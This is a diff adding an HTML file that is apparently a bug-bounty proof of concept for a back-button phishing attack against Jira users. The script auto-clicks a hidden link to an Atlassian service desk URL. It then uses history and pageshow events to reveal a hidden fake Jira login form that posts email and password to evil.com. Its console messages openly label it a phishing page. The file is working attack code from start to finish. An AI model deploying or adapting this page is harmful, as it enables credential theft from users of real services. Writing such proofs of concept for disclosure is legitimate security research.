@@ -1,0 +1,127 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Jira Clone</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f5f7;
+        }
+        .login-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-container img {
+            width: 100px;
+            margin-bottom: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .login-btn {
+            width: 100%;
+            background: #0052cc;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .social-login {
+            margin-top: 15px;
+        }
+        .social-login button {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .google { background: #db4437; color: white; }
+        .microsoft { background: #2f2f2f; color: white; }
+        .apple { background: #000; color: white; }
+        .slack { background: #4a154b; color: white; }
+    </style>
+</head>
+<body>
+ <div id="forward">
+ <a href="https://bugbounty-test-strangemonkey.atlassian.net/servicedesk/customer/portal/1?q=NOT-FOUND-GO-BACK!!"></a>
+</div>
+<div id="phish" style="display:none;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Jira_%28Software%29_logo.svg" alt="Jira Logo">
+        <h2>Log in to continue</h2>
+	<form action="https://evil.com">
+        <input type="email" placeholder="Email" value="">
+        <input type="password" placeholder="Enter password">
+        <button class="login-btn">Log in</button>
+	</form>
+	<div class="social-login">
+            <button class="google">Google</button>
+            <button class="microsoft">Microsoft</button>
+            <button class="apple">Apple</button>
+            <button class="slack">Slack</button>
+    </div>
+</div>
+
+<script>
+function hide(id) {
+    let el = document.getElementById(id);
+    if (el) el.style.display = 'none';
+}
+
+function show(id) {
+    let el = document.getElementById(id);
+    if (el) el.style.display = 'block';
+}
+
+window.addEventListener("load", function () {
+    history.pushState({ phishing: false }, "", location.href);
+    hide("phish");
+    show("forward");
+});
+
+window.addEventListener("popstate", function (event) {
+    if (event.state && event.state.phishing === false) {
+        console.log("Back button detected - Showing phishing page");
+        hide("forward");
+        show("phish");
+    }
+});
+
+window.addEventListener("pageshow", function (event) {
+    if (event.persisted) {
+        console.log("Page loaded from cache - Showing phishing page");
+        hide("forward");
+        show("phish");
+    }
+});
+
+window.addEventListener("DOMContentLoaded", function () {
+    setTimeout(() => {
+        let link = document.querySelector("#forward a");
+        if (link) {
+            try {
+                link.click();
+            } catch (e) {
+                console.warn("Click automatico bloccato dal browser");
+            }
+        }
+    }, 500);
+});
+</script>
+</body>
+</html>
+
